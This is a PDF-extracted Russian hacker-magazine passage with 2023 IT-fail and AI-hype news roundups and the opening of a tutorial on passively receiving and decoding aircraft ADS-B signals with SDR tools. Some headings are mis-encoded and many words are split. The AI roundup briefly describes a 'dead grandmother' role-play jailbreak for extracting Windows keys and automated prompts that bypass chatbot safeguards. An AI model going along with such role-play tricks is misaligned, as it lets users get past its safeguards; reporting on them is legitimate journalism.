    телем 23,97 Мбит/с. В этом году РФ покину ла топ-100 стран
      и опус тилась на три строчки по сравнению с 2022 годом.
  При этом по ско рости стационарного интернета Россия занима-
             ет 55-е место с результатом 84,74 Мбит/с.

            ФЕЙЛ ГОДА
      У TOYOTA
 КОНЧИЛОСЬ МЕСТО
     НА ДИСКЕ





  Когда работа крупных заводов и пред при ятий наруша ется или вовсе останав-
  ливается из-за хакер ской атаки — это фейл, а так же серь езное пятно
  на репутации всех сот рудников ИБ-отдела. Но когда работа заводов останав-
  ливается из-за закончившегося мес та на диске, это уже эпик фейл!
    Именно такой провал про изошел у компании Toyota: в августе 2023 года
  автопроизво дитель  был  вынужден  на  нес колько  дней  остановить
  работу 12 из 14 своих заводов в Японии и 28 сбороч ных линий из-за сбоев,
  вызванных нехваткой места на сер верах баз дан ных. В ито ге это обернулось
  сни жением объемов производства примерно на 13 тысяч автомобилей
   в день.
    В Toyota объяснили, что сбой случился во время планового обслужива ния
  ИТ-систем, которое заключалось в упо рядочивании данных и удалении фраг-
  менти рован ных данных из БД. Однако хранилище оказалось заполнено
  до отказа, и про изошла ошиб ка, при ведшая к останов ке всей сис темы. Инци-
  дент повлиял непос редс твен но на систему заказа продукции, и в результате
  планирование и выполнение производствен ных заданий стало попросту
  невозможным.


  Äðóãèå ïðîâàëû 2023 ãîäà
    1. Ми нистерство обороны США забыло защитить свой поч товый сервер. Две
     недели сервер раскры вал всем желающим внутренние элек тронные пись-
    ма американских воен ных.
    2. Google Pay по ошибке перечислил день ги на сче та поль зователей.
     От 10 до 1000 долларов США пос тупили на счета пользовате лей по прог-
    рамме Google Pay Reward в виде кешбэка. Одна ко кешбэком эти начис-
     ления не были.
    3. HP «окир пичила» прин теры неудач ным обновлением про шивки. Постра-
     дав шие пожало вались, что у HP нет решения проб лемы, скрытое сер-
     висное меню не отображается, а принтеры попросту перестали заг ружать-
      ся.
    4. На материн ских платах MSI больше года не работает функция Secure Boot.
     Студент обнаружил, что на 290 моделях материн ских плат MSI по умол-
     чанию не работа ет функция Secure Boot, отве чающая за безопасную заг-
      рузку UEFI.
    5. Компания Barracuda Networks рекомендовала клиентам избавиться от уяз-
     вимых ESG. Патчи для критической уяз вимости в Barracuda Email Security
     Gateway (ESG) ока зались неэффектив ны. Про изводитель заявил, что кли-
     ентам сле дует немедленно прекратить исполь зование взломанных ESG
     и выбросить заменить их.


   JavaScript стал самым популярным языком программирования
  по ито гам ежегод ного опроса JetBrains. За ним сле дуют Python,
   HTML/CSS, SQL и Java. При этом самый активный рост популяр-
              ности в этом году показали Rust и Go.

             ХАЙП ГОДА
    БОЛЬШИЕ
 ЯЗЫКОВЫЕ МОДЕЛИ





  Встре чай новую номинацию в нашей подборке!
    Было бы странно, если бы мы обош ли стороной повсемес тный бум ИИ
  и нейросетей. Популярность этой темы в информа ционном пространс тве
  ярко иллюстри рует один простой факт: Кем бриджский словарь англий ского
  языка (Cambridge Dictionary) назвал глагол «галлюцинировать» словом года.
  И да, име ется в виду новое значение этого тер мина, который словарь опре-
  деляет как про изве дение ИИ «ложной информации».
    В целом этот год наг лядно показал: бездумное при мене ние ИИ не при-
  водит ни к чему хорошему. Например, пользователи Reddit вы нудили игровые
  издания, которые полага ются на ИИ, писать фаль шивые новости о несущес-
   твующих обновле ниях для World of Warcraft. А в Discord начали применять соз-
  данную ИИ CAPTCHA, которая оказалась абсолютно безум ной и нереша-
  емой.
     Зато энтузиасты не теряли времени даром и приспособили ChatGPT
  и Google Bard для генера ции клю чей для Windows  11, Windows 10 Pro
  и Windows 95. Оказалось, для это го дос таточно попросить чат-бота вес ти
   себя, как усопшая бабушка пользовате ля.
    И конечно, в стороне от всеобщего хай па не остались прес тупники. Так,
  вымогатели активно ге нерируют с помощью ИИ обнаженные фото реальных
  людей, которые затем используют для шантажа. Мошеннические инструмен-
  ты WormGPT и FraudGPT упро щают соз дание фишин говых рас сылок, инстру-
  ментов для взло ма, кардинга и BEC-атак. А скрипт-кидди тем временем при-
  меня ют ChatGPT для соз дания малвари.


  Äðóãèå íîâîñòè ÈÈ 2023 ãîäà
    1. Более тысячи экспертов, включая Возняка и Маска, призвали приоста-
     новить обучение ИИ мощнее GPT-4. В открытом письме упо мина ются
     потенциаль ные  риски  для общества  и  челове чества,  возникающие
     в результате быс трого развития передовых ИИ-систем при отсутс твии
     общих про токолов безопас ности.
    2. Ученые наш ли способ автоматизировать создание вредонос ных запросов
     для чат-ботов с ИИ. Атака на боль шие язы ковые модели позволяет обойти
     средства защиты в ChatGPT, Bard и Claude, вынуждая ИИ выпол нять вре-
     донос ные пром пты.
    3. Nightshade отравляет дан ные, нарушая процесс обучения ИИ-моделей.
     Эксперты пытаются «отравить» ИИ, чтобы помочь художникам и издателям
     защитить свои работы, которые без спроса исполь зуют ся для обучения
     генеративных ИИ, включая Midjourney, DALL-E 3 и Stable Diﬀusion.
    4. Ради дос тупа к GPT-4 люди вору ют плохо защищенные ключи API. В сети
     все чаще рекламируются украден ные токены API OpenAI, которые извле-
     чены из чужого кода.
    5. ИИ ChaosGPT попросили уничтожить человечество и установить мировое
     господс тво. Забав ный эксперимент: ChaosGPT, основанному на опенсор-
     сном Auto-GPT, дали доступ к Google и поп росили уничтожить человечес-
      тво, установить мировое господство и достичь бессмертия.


 ЧЕМ ЕЩЕ ЗАПОМНИТСЯ 2023 ГОД
   Правоохранители от читались о взломе серверов нашумев шей вымогательской группировки
   BlackCat (ALPHV), а также соз дали инструмент для расшифровки данных, который помогает
   постра давшим вос становить файлы.


   Компания Offensive Security выпустила новый дис трибутив Kali Purple, который предназна чен
   для blue и purple team, то есть ориенти рован на оборонительную безопас ность.


   Google предста вила восемь новых доменов верхне го уровня (TLD), которые можно приобрести
   для размещения сайтов или email-адресов: .dad, .esq, .prof, .phd, .nexus, .foo, а также .zip
   и .mov. Пос ледние вызвали спо ры среди ИБ-специалистов, так как многие соч ли их слишком
   опас ными.


  О закрытии объявил один из крупнейших и ста рейших тор рент-тре керов в мире — RARBG,
   работавший с 2008 года. После пят надцати лет работы коман да попрощалась с пользовате-
   лями и объясни ла, что COVID-19, рост цен на электро энергию и спе циаль ная военная опе рация
   сделали даль нейшую работу проекта невозможной.


   Вес ной 2023 года власти закрыли BreachForums, который считался крупнейшим хак форумом,
   посвященным утечкам данных и активно исполь зовался взлом щиками и вымогателями для сли-
   ва информации. Владелец и админис тратор сайта Конор Брай ан Фиц патрик (Conor Brian
    Fitzpatrick), также известный под ником Pompompurin, уже признал себя виновным.
COVERSTORY





Взгляни на небо! Возможно, над твоей
головой каждые несколь ко  минут  будет
про летать самолет, а то и не один. Я живу
недале ко от аэро порта, и воз душный тра-
фик в моем районе осо бен но сильный.            qeewqq                                                                                  qeewwqqq@gmail.com
Сервисы вроде Flightradar24 удивительно
точно показывают информа цию о самоле-
тах в воздухе, потому что получают дан ные
по протоко лу ADS-B. Это можно делать
самостоятельно, и сегодня я покажу как.





Каж дый, конеч но, летал на самолете или видел его хоть раз в своей жиз ни.
Большие металлические пти цы кружат над всей пла нетой и дос тавляют сотни
миллионов  людей  в  разные  части  света.  Так  было  не  всегда:
еще каких-то 100 лет назад люди могли переме щаться только по зем ле,
а свер хнадежных летательных аппаратов не было.
  Уже после изобретения самолетов и начала коммерческих рейсов стало
понятно, что надо как-то отслеживать все находящиеся в воз духе суд на, ина-
че аварий не избе жать. Радары или тем более визу аль ное наблюдение
для это го годятся плохо, и в ход пошла радиосвязь. Теперь на борту каждого
самолета сто ит ави ационный транспондер. Он силь но облегчает работу дис-
петчерам и пилотам и позволяет в полете передавать данные с бортовых дат-
чиков и получать указания с земли.
  Простым язы ком авиационный транспондер — это устройство двунап-
равленной ради освязи, которое делает две вещи:
 1. Îòâå÷àåò íà çàïðîñû íàçåìíûõ ñòàí öèé: когда диспетчер зап-
  рашивает данные, а тран спондер отвечает ему в автоматическом режиме.
  Зап рос данных еще называется èí òåððî ãàöèåé (это слово в переводе
   с английского озна чает «доп рос свидетеля»).
 2. Ñëó æèò ðàäèîìàÿêîì âîç äóøíî ãî ñóä íà: в этом режиме транспон-
   дер раз в некоторое время передает информацию о себе, например мес-
   тоположение или ско рость.

Су ществуют разные поколе ния, они же режимы транспондеров. Каждый
из них создавался для разных целей и имеет свою струк туру сигнала, хотя
более поздние режимы поддержи вают все то же, что и более ранние (при
этом сигналы этих протоко лов несовместимы). Все го есть пять основных
режимов:
 • Mode A передает только идентифика цион ный номер летательного аппа-
   рата. Этот номер может быть жестко зашит в транспондер или наз начен
   диспетче ром  перед  вылетом.  На  практике  использовал ся  только
   для отслеживания того, в каком аэропорту находится самолет.
 • Mode C, созданный позже, позволял отслеживать не только номер аппа-
   рата, но и высоту его полета. Главное его преиму щество было в том, что
   он позволял получать высоту самолета авто мати чески, не спрашивая ее
   у пилота.
 • Mode S — это современ ный режим, который сейчас использует ся на 99%
   всех самоле тов. Позволяет не только получать дан ные с бортовых дат-
   чиков, но и отправить данные обратно на самолет. В этом режиме самолет
  име ет полную двустороннюю связь с назем ными станциями. ADS-B,
   который мы будем рассматривать сегодня, явля ется частью этого режима.
 • Mode 4 и Mode 5 более продвинутые, но используются только воен-
   ными. Оба они защищены куда лучше (то есть вооб ще хоть как-то защище-
   ны, в отли чие от прошлых), и поковы ряться там не получится.

Внимательный читатель сра зу заметит, что в моем списке нет Mode B, как и
Mode D, — оба эти режима просуществовали очень недолго, так что рассмат-
ривать их нет смысла.




                     Ты можешь купить себе собствен ный тран спон-
                      дер — их можно легко най ти на eBay по цене
                      до пяти тысяч дол ларов.



ADS-B

Ес ли вни мательно почитать опи сание Mode S, мож но заметить, что сооб-
щения, которые передаются по это му про токолу, должны отправ лять ся тран-
спон дером по зап росу наземного дис петче ра — все, кроме ADS-B (Automatic
Dependent Surveillance — Broadcast). На русский язык это вольно переводит-
ся как «автомати ческая система слежения за самолетами». Слово Broadcast
тут означает, что сообщения передаются всем подряд, а не кому-то конкрет-
ному, и это откры вает перед нами возможность их при нимать.
  Мно гие выделяют ADS-B как отдельный режим работы транспон дера,
на уров не Mode A, C или S, но на самом деле это всего лишь часть одного
боль шого режима S. Сооб щение ADS-B — это прос то сообщение Mode S,
име ющее тип 17.




В этой статье рассмат ривается только ADS-B (тип 17), но для общего раз-
вития будет нелишним знать и про другие типы сооб щений Mode S:
 • All-call reply (тип 11) — в этом сооб щении по запросу оператора переда-
   ется уникальный 24-битный идентификатор транспондера. Этот номер
   обыч но про шива ется на заводе и не меня ется, но в военных целях этот
  номер иногда под меня ют.
 • ACAS short and long replies (тип 0/16) — сообщения для предотвра-
  щения столкновений между самолетами. Если транспондер обнаружит
   поблизос ти другой самолет, он отпра вит оповещение другим сис темам,
   которые смогут пре дот вра тить столкно вение в воз духе.
 • Altitude and identity replies (тип 4/5) — сооб щение с дан ными о высоте
   и позыв ном (так называемый squawk-код, который пилот вво дит вручную
   перед полетом).
 • Comm-B (тип 20/21) — это сообщения с показа ниями бортовых дат чиков,
   намеченным маршрутом и другими дан ными, которые могут быть полез ны
   для управле ния судном.

Осо бенно хит ро работает ACAS, но разговор о нем выходит за рам ки этой
статьи. Если хочешь глуб же изучить тему — отме чайся в комментариях, и,
воз можно, я напишу про должение!



Все сообщения Mode S передаются на самолет на частоте 1030 МГц, а на
зем лю — на частоте 1090 МГц.
  Сама ради опе редача никак не шифрует ся, а передается масса интерес-
ной информации о местонахождении самолета, его высоте, скорос ти и дру-
гих парамет рах,  так что в какой-то момент появились сервисы вроде
Flightradar24, которые сделали информацию о самолетах дос тупной всем
и даром. Сами сер висы эту информацию получа ют от большого количества
датчиков, уста новленных у доб ровольцев по всему миру. Ты тоже можешь
стать одним из них — достаточно прос то изъявить желание и получить от вла-
дельцев сервиса датчик для установки.


Ôèçè÷åñêàÿ ñòðóêòóðà ñèãíàëà
Сиг налы ADS-B самолет передает на частоте 1090 МГц, как и все осталь ные
сиг налы Mode S. Вто рая частота — 1030 МГц (uplink) — тут не нужна, потому
что сигналы ADS-B переда ются без запроса.
  Для кодирования используется PPM (Pulse-Position Modulation). Грубо
говоря, в эфир просто передаются биты, которые можно прочитать, сделав
выбор ку  каждые N мик росекунд. Это хорошо  видно  на изображении
из Википедии.





                          Как работает PPM

В ADS-B дли тельность каждого такого бита равна 0,5 мкс, а значит, можно
сде лать выбор ку каж дые 0,5 мкс, увидеть высокий или низ кий уровень каж-
дого бита, записать, а потом преобра зовать результат в байты, чтобы
получить исходное сообщение. Но это в теории, потому что на практике есть
проблемы, с которыми мы будем раз бираться по ходу повествования.


Ñòðóêòóðà ïàêåòà
Ес ли принять дан ные как есть, получится битовая каша, из которой еще нужно
вытащить полезные данные. Сами они имеют очень четкую структуру, так что,
если заметить ее пос тоянные час ти в потоке данных, можно будет получить
и весь пакет.





Пакет сос тоит из преамбулы и собственно данных. На картинке выше хорошо
видно, что пре амбула идет 8 мкс, а дальше в течение 56 или 112 мкс идут
данные.
   Вступление особен но важно, если вспом нить, что все самоле ты веща ют
на одной частоте и сиг налы от них могут при ходить одновременно. Проблема
потери накладывающихся сигналов решается очень просто: если что-то
не ловит ся, это поймает кто-то дру гой. Приемни ков очень мно го, и покрыва-
ют они всю обитаемую площадь Земли, так что, если конкретный сигнал ока-
зался слишком слабым и не был принят на одном приемнике, он будет дос-
таточно гром ким для другого при емника и не потеря ется. Конечно, такой под-
ход не означает, что будут получе ны все сигналы, но это и не нужно — они
регулярно повторя ются, и от потери части сигналов беды не будет.
  Я уже говорил, что каждый бит кодиру ется 0,5 мкс, и это действитель но
так, но для упро щения приема была введена условность: 1 нас тоящий бит
кодируется двумя по 0,5 мкс. Еди ница при этом кодируется как 1 и 0,
а ноль — как 0 и 1 (то есть дан ные 1011 будут выглядеть как 10011010).
Это не усложняет при емник, но защища ет от помех и поз воляет надеж но
ловить сигнал. Без этой доработки переда ча нескольких нулей будет выг-
лядеть как тишина в эфире, а так при емник всег да точно видит сигнал, даже
если передаются нули.


Ñòðóêòóðà ïîëåçíûõ äàííûõ
Предположим, мы декодировали сиг нал и нашли в нем сообщение. Теперь
нуж но декоди ровать блок полезных данных и отсеять ненужное (то есть все
сообщения Mode S, кро ме ADS-B).



                        По ля ADS-B

Длина инте ресующего нас сооб щения — 112 мкс, что как раз равно 112 бит
(спасибо двухбитно му кодированию!), и делится оно на пять основных бло-
ков:
 1. DF (Downlink Format) — код формата передачи, 5 бит. Для ADS-B он всегда
   равен 17.
 2. CA (Transponder capability) — тип передат чика и его уровень возможнос-
   тей, 3 бита. Нужно это поле для того, что бы дис петчер знал, какие данные
  мож но запрашивать у этого транспон дера. Это поле может иметь зна-
   чение 0, 4, 5 или 6, а 1–3 и 7 зарезер вирова ны для будуще го исполь-
   зования. 0 — это транспондер пер вого уровня, и обыч но такие транспон-
  деры не име ют ACAS (системы предотвращения столкно вений). 4 —
   это транспондер второго или более совершенно го уров ня, тоже не име-
  ющий ACAS, но уме ющий переда вать высоту (то есть работать с Mode C
   и Mode S). 5 и 6 — это тот же 4, но с поддержкой ACAS, который может
   быть вклю чен (6) или вык лючен (5).
 3. ICAO — уни кальный номер самолета, 24 бита. Номер нужен для опре деле-
   ния отпра вителя сиг нала. Этот номер однократно прошивается на заводе
   и никогда не меняется в про цессе эксплуатации, но все же есть ребята,
   которые уме ют их менять. Существуют еще военные транспондеры, но на
   них вообще никакие правила не дей ствуют, так что там может быть что
   угодно.
 4. ME (Message) — собственно полез ная наг рузка с данными о высоте, ско-
   рости или чем-то другим, дли на — 56 бит. Этот блок мы будем подробно
   разбирать ниже.
 5. PI (Parity/Interrogator ID) — контрольная сум ма, 24 бита.


Ïîëå ME
По ле ME — это самая интерес ная для нас часть, ведь именно тут передаются
коор динаты, скорость полета, высота и другие дан ные с бортовых датчиков.
56 бит маловато для передачи всех данных разом, так что у каждого сооб-
щения свой тип, который указывается в пер вых пяти битах этого поля. Получа-
ется эдакая мат решка: свой формат сооб щения у Mode S, чтобы обоз начить
ADS-B, и свой фор мат сообщения внутри ADS-B, чтобы сказать, что за дан-
ные внутри.
  Все го у ADS-B 31 тип данных, но мы раз берем толь ко самые главные.
  Êîä 1–4 — сооб щение с иден тифика цион ными данными. Там содер-
жится позыв ной и другие данные, свя занные с регистрацией и опознаватель-
ными  свойствами  самолета  (например,  легкий  летательный  аппарат
или тяжелый). Эти позывные показывают ся на терминалах в аэропортах
и представляют собой номер рей са. Декоди рованное сообщение выглядит
при мерно так:


ME : ADSB Msg Type  : (4) Aircraft Identification and Category
CAT: Aircraft Cat   : (0:0) No ADS-B Emitter Category Information
    flight Number   : SIA224
Wake Type           : (TC:4 CAT:0) - No Information Provided

Êîä 5–8 — позиция на земле. Эти дан ные обычно используются, чтобы
знать, где и на какой полосе находится самолет. В сооб щении можно найти
широту, долготу, скорость и нап равление дви жения самолета. Пример
декоди рованного сообщения:


ME : ADSB Msg Type  : (7) Surface Position
  Super Sonic?      : No
  velocity          : 0.00
  EW/NS VEL         : (East/west: 0) (North/South: 0)
  heading           : 253.12
Before Decoding : Half of vehicle location
  UTC Sync?     : false
  CPR Frame     : Odd
  CPR latitude  : 8675
  CPR longitude : 17674

Êîä 9–19 — позиция в воздухе (обычно переда ется вместе с высотой). Важ-
но понимать, что най ти в примере ниже привычную широту и долготу нельзя,
пос коль ку исполь зуется короткая нотация координат вместо нормальной. Что
делать с такими коор динатами — расскажу ниже.


ME : ADSB Msg Type  : (14) Airborne Position (with Barometric
altitude)
  Containment Radius: 1852.00 metres
  Surveillance      : (status:0) No condition information
  NIC Supplement B  : 0
  Nav Integrity     : 5
AC: altitude        : 3100 feet (q bit: false, m bit: false)
Before Decoding : Half of vehicle location
  UTC Sync?     : true
  CPR Frame     : Odd
  CPR latitude  : 101906
  CPR longitude : 103292

Êîä 19 — скорость воз душно го судна.


ME : ADSB Msg Type  : (19) Airborne velocity
SUB:      Sub Type  : 3
  Intent Change     : false
  IFR Capable       : true
  Nav Accuracy Cat  : 0
  heading           : 8.44
  Super Sonic?      : No
  velocity          : 136.00
  EW/NS VEL         : (East/west: 0) (North/South: 0)
  Vertical Rate     : -768
  HAE Delta         : Unavailable

Разбирать по битам структуру каждого сооб щения можно очень дол го, так
что, если тебе действительно интересно, можно поискать готовые парсеры
ADS-B на GitHub и под смотреть структуру там. Нам же сей час раз бирать
строение этих сообщений нет смысла еще и потому, что передавать мы пока
что ничего не будем, а углублять ся в тонкости протокола не хочется.


CPR, ÈËÈ ÊÀÊ ÓÑËÎÆÍÈÒÜ ÏÐÎÑÒÎÅ

Для точного определе ния координат обыч но используются два чис ла —
широта и долгота. 32 бита oat обеспечивают точность до семи зна ков после
запятой, что в пересчете на координаты дает точность порядка нес коль ких
сантимет ров, а если чуть умень шить точность (до десят ков сантимет ров), то
два таких числа как раз можно запихнуть в 56 бит сообщения, и не придется
городить неведо мо что с компактными координатами. Точность даже в десят-
ки сантиметров для самолета, летящего со ско ростью больше 100 м/с, прос-
то огромна, так что, чем руководство вались авто ры протокола, понять слож-
но.
  Тем не менее для записи коор динат использует ся формат CPR (Compact
Position Reporting), который, как ясно из названия, предназначен для компак-
тной переда чи координат. Часть данных мы уже видели в примере сигнала
с  коор дината ми  выше. Поскольку  ужать  большое  количество  данных
в маленький объем невоз можно, эти дан ные просто разделили на части
и отправ ляют в два захода, а пакеты ста ли называться прос то «четный»
и «нечетный». Как из этого получить нормальные коор динаты? Сей час покажу!
  Представим, что все самолеты летают в 2D-пространс тве. Это одно прос-
транство разделим на две сетки с разными параметрами и назовем их чет ной
сет кой и нечет ной. Четную сде лаем 4 на 4, а нечетную — 5 на 5.
  До пустим, мы хотим передать местоположение самоле та в сетке раз-
мером 16 на 16 — пусть это будут координаты (9,7). Если бы у нас была одна
сет ка, то мы бы передали просто 9 и 7, а опе рато ры бы у себя на карте нас
наш ли, но в CPR на самом деле сеток две.





                      Две сет ки коор динат

В таких сетках мы укажем наше положение (9,7) в виде (1,3) на четной сет-
ке (сле ва) и (4,2) в нечетной сетке (справа). Когда опе ратор получает оба
сообщения, ему нужно совместить их на обеих сетках.





            Две сетки с нанесенными данными из пакетов

Ес ли наложить сет ки с полученным координата ми друг на дру га, в точке сов-
падения и будет находить ся искомый объект.





                Вычис ление полных коор динат

Я опи сал алгоритм без матема тических вык ладок и прочих сложностей, чтобы
ты мог пример но представить себе, как работа ет вос становление координат
из двух частей. Реальная сетка далека от случая из при мера и выглядит,
как на картинке ниже.





                         Реальная сет ка




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





              ПРИНИМАЕМ И ПАРСИМ
              АВИАЦИОННЫЙ ТРАФИК





ÏÐÎÑÒÎÉ ÑÏÎÑÎÁ ÏÐÈÍßÒÜ ADS-B

Те перь, ког да мы зна ем устрой ство всех основных частей про токола, можно
попробовать при нять реальный сиг нал. Для приема любого подоб ного сиг-
нала пот ребуются три базовые вещи: антенна, при емник и ПК.


Àíòåííà
Нач нем с самого важ ного предмета, без которого не обходится никакая
радиосвязь, — антенны. Выбор антенны зависит от множес тва факторов,
включая частоту, нап равленность сигнала, сре ду его прохождения. Наш сиг-
нал передается на час тоте 1090 МГц, и принимать мы его будем на откры том
воз духе. Самый простой вариант (но не самый эффективный) — это обычная
шты ревая антенна. Такую антенну можно сделать из куска провода или про-
волоки, главное здесь — правиль но рассчитать ее длину. Длина антенны
зависит от длины вол ны, которую мы хотим на эту антенну при нимать. Длина
вол ны — это рассто яние между дву мя соседними «горбами» сигнала (на
рисунке снизу).





                      Длина волны — это λ

Лямбда — это и есть дли на волны, а получить ее из частоты можно по фор-
муле λ = C/f, где Ñ — скорость света, а f — частота сиг нала. Для 1090 МГц
она будет примерно равна 27,5 см. Если взять металлический штырь такой
длины, то у тебя получит ся так называемая пол новолновая антенна, которую
можно спо кой но уко ротить вдвое или даже в четыре раза, чтобы получить
полувол новую  или  четвертьволновую  антенну  соответственно.  Разница
в чувс тви тельности этих антенн, конечно, будет, так что советую исполь зовать
полувол новую антенну, длина которой сос тавит при мерно 13,75 см.




                      Если хочешь поколхозить по полной, почитай
                        гайд, как сделать дипольную антенну для работы
                        с ADS-B из пробки и про воло ки.


Де лать свою антенну я не буду — это не самое прос тое занятие, да и нуж ная
антенна у меня уже была. Тебе могут подойти, например, антенны для раций,
если при нимать на открытом пространстве и вокруг не слишком много
шумов. Я использую обычную штыревую coil-loaded-антенну, которая, по сути,
работа ет как штыревая, но за счет катуш ки име ет меньшую длину.





                       Моя антенна

Основные характеристики антенны можно измерить специальным векторным
ана лизатором, который генери рует раз ные частоты и про веряет реакцию
антенны на них.





                   Векторный ана лиза тор NanoVNA

Вывод анализатора кажется сложным на первый взгляд, но на самом деле
все доволь но прос то. Что бы узнать, годится ли антенна для какой-то конкрет-
ной частоты, достаточно посмотреть на жел тую линию SWR, которая по-рус-
ски называется КСВ (коэф фици ент стоячей волны). Этот коэффици ент
показы вает, какую часть сигнала антенна переда ла в эфир, а какая вер нулась.
Чем мень ше сигнала вернулось, тем луч ше антенна работает на конкретной
частоте.
  На при боре видно, что на мет ке 1 (я выс тавил ее на частоту 1090 МГц)
SWR равен 1,73, что очень даже неп лохо. Обычно хорошей антенной считает-
ся та, у которой КСВ около 1 (не больше 2).


Ïðèåìíèê
В качестве при емника мы будем использовать SDR-донгл. Он пред став ляет
собой обык новенное радио, которое управля ется с помощью спе циальных
программ, а не кру тилкой с делени ями, как на дедовских при емниках.
Для при ема ADS-B подойдет любой SDR-адаптер, начиная с самого дешево-
го RTL-SDR и закан чивая дорогими BladeRF и ему подобными. Цена дешевых
вари антов начина ется от 30 долларов, так что при общиться может каждый.
  Я буду исполь зовать BladeRF micro — он поддерживает большой диапазон
частот и имеет большую частоту выбор ки, о которой поговорим поз же.





                              BladeRF




                      Если у тебя еще нет SDR — не беда, RTL-SDR сто-
                         ит всего око ло 30 долларов и про дается во мно-
                         гих интернет-магазинах. Вот толь ко имей в виду,
                         что этот при бор умеет только принимать сигналы,
                      но не умеет переда вать их.


Ñîáèðàåì âñё âìåñòå
Те перь, когда у тебя есть антенна и SDR, нуж но найти свободное от помех
и пре пятствий место — я просто выехал за город километ ров на десять. Сиг-
налы око ло 1 ГГц (к которым относится и наш ADS-B) почти не распростра-
няют ся за горизонт, так что, если ты не живешь около аэро порта и вокруг есть
пре пятствия, мож но не пой мать вооб ще ничего.




Между антенной и SDR можно добавить фильтр, который отсечет часть
шумов. Существуют спе циальные фильтры для ADS-B, заказать из Китая мож-
но за 10–15 дол ларов.


Для изучения эфира я буду использовать GQRX, эта программа доступна
для Linux и macOS. Если у тебя Windows, рекомен дую SDR#. В Ubuntu GQRX
устанав ливается из штат ных репози тори ев:


apt update
apt install -y gqrx

Дальше делаем звук погромче, выбираем источником наш SDR и нажимаем
на большую кнопку «Старт». Если все сде лано правильно, из динамиков нач-
нет шипеть так, что ты подпрыг нешь на стуле, после чего отключишь зву ки
кнопкой Mute, расположенной в правом ниж нем углу.
   Частоту приема можно выбрать в верхней час ти экрана — нужно задать
там значение 1.090.000, что равно 1090 МГц. После этого ты увидишь что-то
похожее на скрин шот внизу.





                          Сиг нал в GQRX

Ко роткие полоски по центру — это и есть сиг нал ADS-B, который заметно
выделяется на фоне окру жающего шума. Если у тебя их нет, попробуй изме-
нить параметры уси ления на вкладке Input Controls спра ва. Если и это
не помогло, перей ди на вкладку FFT Settings и нас трой парамет ры Plot и WF.
Еще можно попробовать покрутить антенну или положить ее в разных нап-
равле ниях.


Dump1090
Когда ты добьешься стабильного приема сиг нала в GQRX, можешь перехо-
дить к сле дующе му шагу.
  В обыч ных случаях, если кто-то хочет просто принять сигналы Mode S
и декоди ровать их, он использует уже готовую прог рамму dump1090. Эта тул-
за с исходным кодом уме ет демодулировать и декодировать почти все сиг-
налы Mode S и даже выводит их в виде красивой таб лички. Чтобы проверить,
все ли у нас работа ет корректно, лучше начать с чего-то заведомо рабочего,
и начнем мы с dump1090.
  Для установки нужно кло нировать репози торий проекта с GitHub и собрать
бинарник. Делается это проще простого:


git clone https://github.com/antirez/dump1090
cd dump1090
make

Пос ле этого у тебя должен появиться бинарник dump1090. Если у тебя RTL-
SDR, можешь использовать dump1090 нап рямую с ним, но у меня BladeRF,
для под держки которого нужно немного повозиться.
   Во-первых, установи драй вер для своего SDR — их можно найти в репози-
ториях прак тичес ки всех дистри бутивов, погуг лить.
   Во-вторых,  нужно  будет  накатить  на SDR  специальную  прошивку.
Для BladeRF эти про шивки доступны на сай те Nuand, где нужно выбрать соот-
ветствующий файл для сво ей вер сии BladeRF.
   Даль ше скачиваем прог рамму для декоди рования сообщений ADS-B
и собираем ее:


git clone https://github.com/Nuand/bladeRF-adsb
cd bladeRF-adsb/bladeRF_adsb
make

Те перь заливаем прошив ку в BladeRF. Сделать это можно с помощью пакета
bladerf-cli:


bladeRF-cli -l ~/Downloads/adsbxA4.rbf

Те перь запускаем в одном окне dump1090, а в другом — bladeRF-adsb,
который мы собира ли парой шагов раньше:


~/Soft/dump1090/dump1090 --raw --device-type bladerf --bladerf-fpga
''
~/Soft/Blade/bladeRF-adsb

Ес ли все сде лано верно, в окне с dump1090 ты увидишь кучу строк в шес тнад-
цатеричном виде. Это и есть сообщения Mode S, которые надо еще декоди-
ровать и отфильтро вать.





                 Пример сырого вывода dump1090

Ес ли убрать --raw из аргу ментов запуска dump1090, то сигналы будут авто-
мати чески декоди роваться и выводиться в таб лицу, как на скриншоте ниже.





            Де кодированные сигналы Mode S в dump1090

В таблице можно най ти уже декодированные из CPR широту и долготу,
позыв ной самолета, его скорость, высоту и другие данные. Но это было бы
слишком прос то, не прав да ли? Давай декодировать эти данные самос-
тоятельно!


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





              ПРИНИМАЕМ И ПАРСИМ
              АВИАЦИОННЫЙ ТРАФИК





ÑËÎÆÍÛÉ ÑÏÎÑÎÁ ÏÐÈÍßÒÜ ADS-B

Что бы принять сигнал самостоятель но, нуж но сначала демодулировать его,
а потом декодировать то, что получится.




                    Демодуляция (детек тирование сиг нала) — про-
                         цесс, обратный модуляции колеба ний, выделение
                    информа ционного   (модулирующего)   сиг нала
                       из   модулирован ного   колебания   высокой
                       (несущей)  частоты. Простым языком  демоду-
                       ляция — это выделе ние сиг нала из колебаний
                      высокой частоты.


ADS-B работа ет с PPM-модуляцией, то есть, чтобы выделить полез ный сиг-
нал, нуж но каж дые 0,5 мкс определять состояние сигнала (0 или 1). План
у нас будет следующий:
 1. Записать сигнал.
 2. Сде лать выборки каждые 0,5 мкс.
 3. Преобразовать их в бай ты.
 4. Декодировать сообщения ADS-B.

Для удобства будем использовать Python либо готовый набор инстру ментов
GNU Radio. На Ubuntu GNU Radio уста нав ливается следующим образом:


sudo add-apt-repository ppa:gnuradio/gnuradio-releases -y
sudo apt update
sudo apt install gnuradio -y

Разуме ется, для работы GNU Radio пот ребу ются и драйверы для твоей SDR.
При этом мы не будем использовать SDR как основной источник сигнала, что-
бы мож но было на заведо мо одинако вых дан ных погонять разные алгоритмы
и срав нить результаты.


Çàïèñü ñèãíàëà
Первое, что нуж но сделать пос ле запуска GNU Radio, — это собрать базовый
пай плайн. Выглядеть он будет, как на скриншоте ниже.





                       Ба зовый пайплайн

Все го тут пять блоков, два из которых — опции и переменная. В самом
начале стоит osmocom Source, который отвечает за получение сырых данных
из SDR. Нас троек в нем много, но для работы нуж ны всего пять (при мер
ниже — для BladeRF):
 1. Device Argument — аргументы, которые будут переданы SDR. Тут впи сыва-
  ем bladerf=0.
 2. Ch0 Freq — час тота нулево го канала. У BaldeRF их два, но нам нужен толь-
   ко один. Сюда впи сываем час тоту ADS-B — это 1090 МГц или 1,09 ГГц.
 3. RF Gain — параметр, задающий чувствитель ность при емни ка. Я уста новил
